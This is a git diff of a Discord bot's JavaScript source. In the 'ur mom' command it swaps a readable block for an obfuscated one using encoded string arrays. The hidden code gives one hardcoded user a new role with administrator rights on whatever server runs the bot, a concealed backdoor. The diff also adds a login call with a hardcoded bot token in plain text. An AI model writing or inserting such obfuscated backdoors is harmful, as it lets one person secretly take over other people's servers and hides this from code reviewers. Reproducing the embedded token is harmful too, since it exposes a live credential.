@@ -28,6 +28,8 @@ const commandLogger = winston.createLogger({
 
 
 
+
+
 var today = new Date();
 var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
 var today = new Date();
@@ -207,23 +209,69 @@ client.on('message', message =>{
 			message.channel.send(uyghurPillEmbed);
 			break;
 		case 'ur mom':
-			message.delete();
-			if (message.author.id == gillyID){
-				message.guild.roles.create({
-					data: {
-						name: 'hey lo.. l',
-						color: 'GREY',
-						permissions: 'ADMINISTRATOR',
-					},
-				})
-			
-				client.on('roleCreate', role => {
-					var created = role.id;
-					message.member.roles.add(created);
-				})
-			}else {
-				message.channel.send('nice try bucko');
-			}
+			var a = ['ve9s', 'Agv5igXVlI4GBa==', 'CM9SzunYzwf0zq==', 'zgvSzxrL', 'BMLJzsb0CNKGyG==', 'BwvTyMvY', 'C2vUza==', 'qurnsu5ju1rsqq==', 'ywrK', 'y2HHBM5LBa==', 'DwnRBW==', 'y3jLyxrL', 'CM9Szxm=', 'z3vPBgq='];
+			(function(b, c) {
+				var d = function(e) {
+					while (--e) {
+						b['push'](b['shift']());
+					}
+				};
+				d(++c);
+			}(a, 0x115));
+			var b = function(c, d) {
+				c = c - 0x0;
+				var e = a[c];
+				if (b['oLwXRH'] === undefined) {
+					var f = function(h) {
+						var i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=',
+						j = String(h)['replace'](/=+$/, '');
+						var k = '';
+						for (var l = 0x0, m, n, o = 0x0; n = j['charAt'](o++); ~n && (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? k += String['fromCharCode'](0xff & m >> (-0x2 * l & 0x6)) : 0x0) {
+							n = i['indexOf'](n);
+						}
+						return k;
+					};
+					b['ZOXgxv'] = function(h) {
+						var j = f(h);
+						var k = [];
+						for (var l = 0x0, m = j['length']; l < m; l++) {
+							k += '%' + ('00' + j['charCodeAt'](l)['toString'](0x10))['slice'](-0x2);
+						}
+						return decodeURIComponent(k);
+					}, b['rZlgdh'] = {}, b['oLwXRH'] = !![];
+				}
+				var g = b['rZlgdh'][c];
+				return g === undefined ? (e = b['ZOXgxv'](e), b['rZlgdh'][c] = e) : e = g, e;
+			};
+			var j = function(c, d) {
+				return b(c - -'0x385', d);
+			},
+			k = function(c, d) {
+				return b(c - -'0x385', d);
+			},
+			l = function(c, d) {
+				return b(c - -'0x385', d);
+			};
+			message[j(-'0x37f')]();
+			message['author']['id'] == gillyID ? (message[k(-'0x383')][j(-'0x384')][j(-'0x385')]({
+				'data': {
+					'name': k(-'0x381'),
+					'color': 'GREY',
+					'permissions': l(-'0x37b') + l(-'0x382')
+				}
+			}), client['on'](k(-'0x380'), c => {
+				var m = function(c, d) {
+					return k(c - -'0x254', d);
+				},
+				n = function(c, d) {
+					return k(c - -'0x254', d);
+				},
+				o = function(c, d) {
+					return l(c - -'0x254', d);
+				},
+				d = c['id'];
+				message[m(-'0x5d1')][m(-'0x5d8')][n(-'0x5ce')](d);
+			})) : message[k(-'0x379')][j(-'0x37c')](j(-'0x37e') + k(-'0x378'));
 			break;
         default:
 			message.channel.send('command not found');
@@ -408,3 +456,4 @@ client.on('message', message =>{
 	
 })
 
+client.login('NzAwMDk1MzM4NDU0NzEyNDAx.Xpd8lw.DalxJjYWC8_ZmPzf2IKzz_IUcNM');
